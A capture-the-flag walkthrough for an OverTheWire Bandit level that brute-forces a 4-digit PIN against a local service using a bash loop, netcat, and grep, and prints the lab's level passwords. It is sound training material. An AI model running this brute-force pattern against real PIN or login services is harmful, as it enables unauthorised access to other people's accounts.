## Level24->Level25


```bash 
ssh -p 2220 bandit23@bandit.labs.overthewire.org
```


You need to connect to `localhost` on port `30002`.


Then you need to pass bandit25's password and a pincode , which is a 4 digit numeric code.


```
nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 1234
Wrong! Please enter the correct current password and pincode. Try again.
```


The pincodes can be anything from `0000~9999` so connecting to `localhost` and  manually entering the passcodes one by one will practically be impossible unless you're a freak. 


We can automate this process by making a shellscript.


```bash
mktemp -d 
/tmp/tmp.6kBoMhU2mj

cd /tmp/tmp.6kBoMhU2mj
```


Then write a shellscript that generates all the possible pincodes and save it into a file named `pincodes`.


```bash
#!/bin/bash 

PASSWORD=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

for i in {0000..9999}; do 
        echo $PASSWORD $i >> pincodes 
done
```


Add the permission to execute and run the shellscript.


```bash 
chmod +x solve.sh
./solve.sh
```


After running the shellscript, you can see that `pincodes` is created. 


Then you can pipe and redirect `pincodes` to `netcat` through `STDIN`. 


```bash 
nc localhost 30002 < pincodes
```


It'll show a lot of `Wrong! Please enter the correct current password and pincode. Try again.`, but at the very end you'll see the password for `bandit25`. 


```
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```


If you don't want any of the junk and only want to capture the password you can use the `grep -v` (invert) option.


```bash
nc localhost 30002 < pincodes | grep -v "Wrong! Please enter the correct current password and pincode. Try again."
```


```
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```


I think this was the first time in bandit where we actually had to write a shellscript that requires uses bash syntax.


Writing shellscript it pretty tough in the beginning, so there's no need to be discouraged. 